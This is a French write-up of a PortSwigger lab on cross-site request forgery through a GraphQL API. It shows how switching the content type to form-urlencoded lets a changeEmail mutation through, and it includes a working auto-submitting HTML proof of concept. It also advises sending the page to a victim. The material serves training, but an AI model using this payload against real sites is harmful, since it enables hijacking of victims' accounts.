# Lab

https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api

## Solution

Changer le `Content-Type` en `x-www-form-urlencoded` et ajouter le paramètre `query` avec la valeur du POST initial sous forme URL :

```http
POST /graphql/v1 HTTP/2
Host: 0a1500fc03f2853982310bfc00a50002.web-security-academy.net
Cookie: session=jILLI3cV1WML6odXVEqAiktduGjnaPDf; session=jILLI3cV1WML6odXVEqAiktduGjnaPDf
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Accept: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0a1500fc03f2853982310bfc00a50002.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1500fc03f2853982310bfc00a50002.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 163

query=mutation+changeEmail($input%3a+ChangeEmailInput!)+{changeEmail(input%3a+$input)+{+email+}+}&operationName=changeEmail&variables={"input":{"email":"mdr@lol.net"}}
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 75

{
  "data": {
    "changeEmail": {
      "email": "mdr@lol.net"
    }
  }
}
```

Avec Burp Suite on peut générer un PoC CSRF :

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1500fc03f2853982310bfc00a50002.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#32;email&#32;&#125;&#32;&#125;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;mdr&#64;lol&#46;net&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

L'envoyer à la victime et l'inciter à l'ouvrir.